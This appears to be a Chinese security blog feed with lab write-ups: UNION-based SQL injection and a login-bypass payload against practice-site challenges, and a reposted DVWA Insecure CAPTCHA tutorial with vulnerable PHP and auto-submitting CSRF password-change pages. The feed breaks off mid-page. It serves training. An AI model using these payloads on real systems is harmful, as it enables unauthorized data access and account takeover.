    <link href="http://wlfsky.com/2018/01/20/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%8F%AF%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/"/>
    <id>http://wlfsky.com/2018/01/20/SQL注入之可联合查询注入/</id>
    <published>2018-01-20T13:51:44.000Z</published>
    <updated>2018-01-23T07:52:06.997Z</updated>
    
    <content type="html"><![CDATA[<pre><code>作者：wlfsky格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采</code></pre><a id="more"></a><hr><h2 id="题一：最简单的SQL注入"><a href="#题一：最简单的SQL注入" class="headerlink" title="题一：最简单的SQL注入"></a>题一：最简单的SQL注入</h2><p>题目来自：<a href="http://lab1.xseclab.com/sqli3_6590b07a0a39c8c27932b92b0e151456/index.php" target="_blank" rel="noopener">网络安全实验室</a></p><p>进入后页面显示如下：</p><p><img src="/img/sql-fmz-1.png" alt="sql-fmz-1.png"></p><p>查看源码得：</p><p><img src="/img/sql-fmz-2.png" alt="sql-fmz-2.png"></p><p>然后我们在网址后面加上<code>?id=1</code> 发现页面没有什么变化，这时我们可以改变id的值，在id=3时得到了一个小信息：flag就在这个表中，然后就可以开始注入了。</p><p>在网址后面加单引号，使之变为：</p><p><a href="">http://lab1.xseclab.com/sqli3_6590b07a0a39c8c27932b92b0e151456/index.php?id=1’</a></p><p>然后发现页面报错，存在注入点：</p><p><img src="/img/sql-fmz-3.png" alt="sql-fmz-3.png"></p><p>经<code>id=1 and 1=1</code> 、<code>id=1 and 1=2</code> 判断注入为数字型。</p><p><strong>方法一：</strong></p><p><a href="">http://lab1.xseclab.com/sqli3_6590b07a0a39c8c27932b92b0e151456/index.php?id=1 or 1=1</a></p><p>暴出全部数据，得到flag：</p><p><img src="/img/sql-fmz-4.png" alt="sql-fmz-4.png"></p><p><strong>方法二：</strong></p><p><code>order by</code> 或者<code>union select 1,2,3...</code> <strong>猜解SQL查询语句中的字段数</strong>：</p><p><a href="">http://lab1.xseclab.com/sqli3_6590b07a0a39c8c27932b92b0e151456/index.php?id=1 order by N</a></p><p>N从1开始逐渐增大，判断SQL查询语句的字段数为3。</p><p><strong>确定字段显示位置：</strong></p><p><a href="">http://lab1.xseclab.com/sqli3_6590b07a0a39c8c27932b92b0e151456/index.php?id=1 union select 1,2,3</a></p><p><img src="/img/sql-fmz-5.png" alt="sql-fmz-5.png"></p><p><strong>暴出表名：</strong></p><p><a href="">http://lab1.xseclab.com/sqli3_6590b07a0a39c8c27932b92b0e151456/index.php?id=1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()</a></p><p>得到表名：</p><p><img src="/img/sql-fmz-6.png" alt="sql-fmz-6.png"></p><p><strong>暴出列名：</strong></p><p><a href="">http://lab1.xseclab.com/sqli3_6590b07a0a39c8c27932b92b0e151456/index.php?id=1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’sae_user_sqli3’</a></p><p>得到列名：</p><p><img src="/img/sql-fmz-7.png" alt="sql-fmz-7.png"></p><p><strong>暴出数据：</strong></p><p><a href="">http://lab1.xseclab.com/sqli3_6590b07a0a39c8c27932b92b0e151456/index.php?id=1 union select 1,2,group_concat(id,0x3a,title,0x3a,content) from sae_user_sqli3</a></p><p><img src="/img/sql-fmz-8.png" alt="sql-fmz-8.png"></p><p>得到flag。</p>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;作者：wlfsky
格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="SQL注入" scheme="http://wlfsky.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="http://wlfsky.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入之万能密码</title>
    <link href="http://wlfsky.com/2018/01/20/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/"/>
    <id>http://wlfsky.com/2018/01/20/SQL注入之万能密码/</id>
    <published>2018-01-20T13:14:14.000Z</published>
    <updated>2018-01-23T07:53:30.052Z</updated>
    
    <content type="html"><![CDATA[<pre><code>作者：wlfsky格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采</code></pre><a id="more"></a><hr><h2 id="题一：最简单的SQL注入"><a href="#题一：最简单的SQL注入" class="headerlink" title="题一：最简单的SQL注入"></a>题一：最简单的SQL注入</h2><p><strong>Tips:</strong>题目里有简单提示</p><p>题目来自：<a href="http://lab1.xseclab.com/sqli2_3265b4852c13383560327d1c31550b60/index.php" target="_blank" rel="noopener">网络安全实验室</a></p><p>进入后页面显示如下：</p><p><img src="/img/sql-wn-1.png" alt="sql-wn-1.png"></p><p>然后我们F12查看一下网页源码得到信息：</p><p><img src="/img/sql-wn-2.png" alt="sql-wn-2.png"></p><p>然后就开始我们的注入吧，先猜测一下后台的SQL语句为：</p><p><code>select username,password from users where username=&#39;用户名&#39; and password=&#39;密码&#39;</code></p><p>所以可以构造语句为：<code>admin&#39; #</code></p><p><img src="/img/sql-wn-3.png" alt="sql-wn-3.png"></p><p>登录提示用户名和密码不能为空：</p><p><img src="/img/sql-wn-4.png" alt="sql-wn-4.png"></p><p>所以就随便输入几个字符，然后再次登录成功得到<strong>flag</strong>：</p><p><img src="/img/sql-wn-5.png" alt="sql-wn-5.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;作者：wlfsky
格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="SQL注入" scheme="http://wlfsky.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="http://wlfsky.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>DVWA之Insecure CAPTCHA</title>
    <link href="http://wlfsky.com/2018/01/19/DVWA%E4%B9%8BInsecure-CAPTCHA/"/>
    <id>http://wlfsky.com/2018/01/19/DVWA之Insecure-CAPTCHA/</id>
    <published>2018-01-19T08:01:01.000Z</published>
    <updated>2018-01-19T08:09:51.179Z</updated>
    
    <content type="html"><![CDATA[<pre><code>作者：wlfsky格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采</code></pre><a id="more"></a><hr><p><strong><em>本文转载自 FreeBuf.COM：lonehand</em></strong></p><h2 id="DVWA简介"><a href="#DVWA简介" class="headerlink" title="DVWA简介"></a><strong>DVWA简介</strong></h2><p>DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。</p><p>DVWA共有十个模块，分别是</p><blockquote><p>Brute Force（蛮力攻击）</p><p>Command Injection（命令行注入）</p><p>CSRF（跨站请求伪造）</p><p>File Inclusion（文件包含）</p><p>File Upload（文件上传）</p><p>Insecure CAPTCHA （不安全的验证码）</p><p>SQL Injection（SQL注入）</p><p>SQL Injection（Blind）（SQL盲注）</p><p>XSS（Reflected）（反射型跨站脚本）</p><p>XSS（Stored）（存储型跨站脚本）</p></blockquote><p>需要注意的是，DVWA 1.9的代码分为四种安全级别：Low，Medium，High，Impossible。初学者可以通过比较四种级别的代码，接触到一些PHP代码审计的内容。</p><p><img src="/img/dvwa-sql-1.png" alt="dvwa-sql-1.png"></p><h2 id="Insecure-CAPTCHA"><a href="#Insecure-CAPTCHA" class="headerlink" title="Insecure CAPTCHA"></a><strong>Insecure CAPTCHA</strong></h2><p>Insecure CAPTCHA，意思是不安全的验证码，CAPTCHA是Completely Automated Public Turing Test to Tell Computers and Humans Apart (全自动区分计算机和人类的图灵测试)的简称。但个人觉得，这一模块的内容叫做不安全的验证流程更妥当些，因为这块主要是验证流程出现了逻辑漏洞，谷歌的验证码表示不背这个锅。</p><p><a href="http://image.3001.net/images/20161110/1478762521859.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161110/1478762521859.png!small" alt="1.png"></a></p><p><strong>reCAPTCHA验证流程</strong></p><p>这一模块的验证码使用的是Google提供reCAPTCHA服务，下图是验证的具体流程。</p><p><a href="http://image.3001.net/images/20161110/14787625541269.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161110/14787625541269.png!small" alt="1.png"></a></p><p>服务器通过调用recaptcha_check_answer函数检查用户输入的正确性。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">recaptcha_check_answer($privkey,$remoteip, $challenge,$response)</span><br></pre></td></tr></table></figure><p>参数$privkey是服务器申请的private key，$remoteip是用户的ip，$challenge是recaptcha_challenge_field字段的值，来自前端页面 ，$response是recaptcha_response_field字段的值。函数返回ReCaptchaResponse class的实例，ReCaptchaResponse类有2个属性 ：</p><blockquote><p>$is_valid是布尔型的，表示校验是否有效，</p><p>$error是返回的错误代码。</p></blockquote><p>（ps:有人也许会问，那这个模块的实验是不是需要科学上网呢？答案是不用，因为我们可以绕过验证码）</p><p>下面对四种级别的代码进行分析。</p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a><strong>Low</strong></h2><p>服务器端核心代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Change'</span> ] ) &amp;&amp; ( $_POST[ <span class="string">'step'</span> ] == <span class="string">'1'</span> ) ) &#123; </span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form </span></span><br><span class="line">    $hide_form = <span class="keyword">true</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $pass_new  = $_POST[ <span class="string">'password_new'</span> ]; </span><br><span class="line">    $pass_conf = $_POST[ <span class="string">'password_conf'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check CAPTCHA from 3rd party </span></span><br><span class="line">    $resp = recaptcha_check_answer( $_DVWA[ <span class="string">'recaptcha_private_key'</span> ], </span><br><span class="line">        $_SERVER[ <span class="string">'REMOTE_ADDR'</span> ], </span><br><span class="line">        $_POST[ <span class="string">'recaptcha_challenge_field'</span> ], </span><br><span class="line">        $_POST[ <span class="string">'recaptcha_response_field'</span> ] ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Did the CAPTCHA fail? </span></span><br><span class="line">    <span class="keyword">if</span>( !$resp-&gt;is_valid ) &#123; </span><br><span class="line">        <span class="comment">// What happens when the CAPTCHA was entered incorrectly </span></span><br><span class="line">        $html     .= <span class="string">"&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;"</span>; </span><br><span class="line">        $hide_form = <span class="keyword">false</span>; </span><br><span class="line">        <span class="keyword">return</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// CAPTCHA was correct. Do both new passwords match? </span></span><br><span class="line">        <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123; </span><br><span class="line">            <span class="comment">// Show next stage for the user </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">" </span></span><br><span class="line"><span class="string">                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt; </span></span><br><span class="line"><span class="string">                &lt;form action=\"#\" method=\"POST\"&gt; </span></span><br><span class="line"><span class="string">                    &lt;input type=\"hidden\" name=\"step\" value=\"2\" /&gt; </span></span><br><span class="line"><span class="string">                    &lt;input type=\"hidden\" name=\"password_new\" value=\"&#123;$pass_new&#125;\" /&gt; </span></span><br><span class="line"><span class="string">                    &lt;input type=\"hidden\" name=\"password_conf\" value=\"&#123;$pass_conf&#125;\" /&gt; </span></span><br><span class="line"><span class="string">                    &lt;input type=\"submit\" name=\"Change\" value=\"Change\" /&gt; </span></span><br><span class="line"><span class="string">                &lt;/form&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="comment">// Both new passwords do not match. </span></span><br><span class="line">            $html     .= <span class="string">"&lt;pre&gt;Both passwords must match.&lt;/pre&gt;"</span>; </span><br><span class="line">            $hide_form = <span class="keyword">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Change'</span> ] ) &amp;&amp; ( $_POST[ <span class="string">'step'</span> ] == <span class="string">'2'</span> ) ) &#123; </span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form </span></span><br><span class="line">    $hide_form = <span class="keyword">true</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $pass_new  = $_POST[ <span class="string">'password_new'</span> ]; </span><br><span class="line">    $pass_conf = $_POST[ <span class="string">'password_conf'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if both password match </span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123; </span><br><span class="line">        <span class="comment">// They do! </span></span><br><span class="line">        $pass_new = mysql_real_escape_string( $pass_new ); </span><br><span class="line">        $pass_new = md5( $pass_new ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update database </span></span><br><span class="line">        $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>; </span><br><span class="line">        $result = mysql_query( $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Issue with the passwords matching </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>; </span><br><span class="line">        $hide_form = <span class="keyword">false</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，服务器将改密操作分成了两步，第一步检查用户输入的验证码，验证通过后，服务器返回表单，第二步客户端提交post请求，服务器完成更改密码的操作。但是，这其中存在明显的逻辑漏洞，服务器仅仅通过检查Change、step 参数来判断用户是否已经输入了正确的验证码。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p>1.通过构造参数绕过验证过程的第一步</p><p>首先输入密码，点击Change按钮，抓包：</p><p><a href="http://image.3001.net/images/20161110/14787628337241.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161110/14787628337241.png!small" alt="1.png"></a></p><p>（ps:因为没有翻墙，所以没能成功显示验证码，发送的请求包中也就没有recaptcha_challenge_field、recaptcha_response_field两个参数）</p><p>更改step参数绕过验证码：</p><p><a href="http://image.3001.net/images/20161110/14787628821104.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161110/14787628821104.png!small" alt="1.png"></a></p><p>修改密码成功：</p><p><a href="http://image.3001.net/images/20161110/1478762911998.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161110/1478762911998.png!small" alt="1.png"></a></p><p>2.由于没有任何的防CSRF机制，我们可以轻易地构造攻击页面，页面代码如下（详见CSRF模块的教程）。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">"document.getElementById('transfer').submit()"</span>&gt;</span>       <span class="tag">&lt;<span class="name">div</span>&gt;</span>        </span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">id</span>=<span class="string">"transfer"</span> <span class="attr">action</span>=<span class="string">"http://192.168.153.130/dvwa/vulnerabilities/captcha/"</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password_new"</span> <span class="attr">value</span>=<span class="string">"password"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password_conf"</span> <span class="attr">value</span>=<span class="string">"password"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"step"</span> <span class="attr">value</span>=<span class="string">"2"</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"Change"</span> <span class="attr">value</span>=<span class="string">"Change"</span>&gt;</span>        <span class="tag">&lt;/<span class="name">form</span>&gt;</span>          </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当受害者访问这个页面时，攻击脚本会伪造改密请求发送给服务器。</p><p><a href="http://image.3001.net/images/20161110/14787631004643.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161110/14787631004643.png!small" alt="1.png"></a></p><p>美中不足的是，受害者会看到更改密码成功的界面（这是因为修改密码成功后，服务器会返回302，实现自动跳转），从而意识到自己遭到了攻击。</p><p><a href="http://image.3001.net/images/20161110/14787631292942.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161110/14787631292942.png!small" alt="1.png"></a></p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a><strong>Medium</strong></h2><p>服务器端核心代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Change'</span> ] ) &amp;&amp; ( $_POST[ <span class="string">'step'</span> ] == <span class="string">'1'</span> ) ) &#123; </span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form </span></span><br><span class="line">    $hide_form = <span class="keyword">true</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $pass_new  = $_POST[ <span class="string">'password_new'</span> ]; </span><br><span class="line">    $pass_conf = $_POST[ <span class="string">'password_conf'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check CAPTCHA from 3rd party </span></span><br><span class="line">    $resp = recaptcha_check_answer( $_DVWA[ <span class="string">'recaptcha_private_key'</span> ], </span><br><span class="line">        $_SERVER[ <span class="string">'REMOTE_ADDR'</span> ], </span><br><span class="line">        $_POST[ <span class="string">'recaptcha_challenge_field'</span> ], </span><br><span class="line">        $_POST[ <span class="string">'recaptcha_response_field'</span> ] ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Did the CAPTCHA fail? </span></span><br><span class="line">    <span class="keyword">if</span>( !$resp-&gt;is_valid ) &#123; </span><br><span class="line">        <span class="comment">// What happens when the CAPTCHA was entered incorrectly </span></span><br><span class="line">        $html     .= <span class="string">"&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;"</span>; </span><br><span class="line">        $hide_form = <span class="keyword">false</span>; </span><br><span class="line">        <span class="keyword">return</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// CAPTCHA was correct. Do both new passwords match? </span></span><br><span class="line">        <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123; </span><br><span class="line">            <span class="comment">// Show next stage for the user </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">" </span></span><br><span class="line"><span class="string">                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt; </span></span><br><span class="line"><span class="string">                &lt;form action=\"#\" method=\"POST\"&gt; </span></span><br><span class="line"><span class="string">                    &lt;input type=\"hidden\" name=\"step\" value=\"2\" /&gt; </span></span><br><span class="line"><span class="string">                    &lt;input type=\"hidden\" name=\"password_new\" value=\"&#123;$pass_new&#125;\" /&gt; </span></span><br><span class="line"><span class="string">                    &lt;input type=\"hidden\" name=\"password_conf\" value=\"&#123;$pass_conf&#125;\" /&gt; </span></span><br><span class="line"><span class="string">                    &lt;input type=\"hidden\" name=\"passed_captcha\" value=\"true\" /&gt; </span></span><br><span class="line"><span class="string">                    &lt;input type=\"submit\" name=\"Change\" value=\"Change\" /&gt; </span></span><br><span class="line"><span class="string">                &lt;/form&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="comment">// Both new passwords do not match. </span></span><br><span class="line">            $html     .= <span class="string">"&lt;pre&gt;Both passwords must match.&lt;/pre&gt;"</span>; </span><br><span class="line">            $hide_form = <span class="keyword">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Change'</span> ] ) &amp;&amp; ( $_POST[ <span class="string">'step'</span> ] == <span class="string">'2'</span> ) ) &#123; </span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form </span></span><br><span class="line">    $hide_form = <span class="keyword">true</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $pass_new  = $_POST[ <span class="string">'password_new'</span> ]; </span><br><span class="line">    $pass_conf = $_POST[ <span class="string">'password_conf'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if they did stage 1 </span></span><br><span class="line">    <span class="keyword">if</span>( !$_POST[ <span class="string">'passed_captcha'</span> ] ) &#123; </span><br><span class="line">        $html     .= <span class="string">"&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;"</span>; </span><br><span class="line">        $hide_form = <span class="keyword">false</span>; </span><br><span class="line">        <span class="keyword">return</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if both password match </span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123; </span><br><span class="line">        <span class="comment">// They do! </span></span><br><span class="line">        $pass_new = mysql_real_escape_string( $pass_new ); </span><br><span class="line">        $pass_new = md5( $pass_new ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update database </span></span><br><span class="line">        $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>; </span><br><span class="line">        $result = mysql_query( $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Issue with the passwords matching </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>; </span><br><span class="line">        $hide_form = <span class="keyword">false</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，Medium级别的代码在第二步验证时，参加了对参数passed_captcha的检查，如果参数值为true，则认为用户已经通过了验证码检查，然而用户依然可以通过伪造参数绕过验证，本质上来说，这与Low级别的验证没有任何区别。</p><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p>1.可以通过抓包，更改step参数，增加passed_captcha参数，绕过验证码。</p><p>抓到的包：</p><p><a href="http://image.3001.net/images/20161110/1478763222683.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161110/1478763222683.png!small" alt="1.png"></a></p><p>更改之后的包：</p><p><a href="http://image.3001.net/images/20161110/14787632525623.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161110/14787632525623.png!small" alt="1.png"></a></p><p>更改密码成功：</p><p><a href="http://image.3001.net/images/20161110/14787632811739.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161110/14787632811739.png!small" alt="1.png"></a></p><p>2.依然可以实施CSRF攻击，攻击页面代码如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;       &lt;body onload=&quot;document.getElementById(&apos;transfer&apos;).submit()&quot;&gt;         &lt;div&gt;          &lt;form method=&quot;POST&quot; id=&quot;transfer&quot; action=&quot;http://192.168.153.130/dvwa/vulnerabilities/captcha/&quot;&gt;       &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;password&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;password&quot;&gt;        &lt;input type=&quot;hidden&quot; name=&quot;passed_captcha&quot; value=&quot;true&quot;&gt;        &lt;input type=&quot;hidden&quot; name=&quot;step&quot; 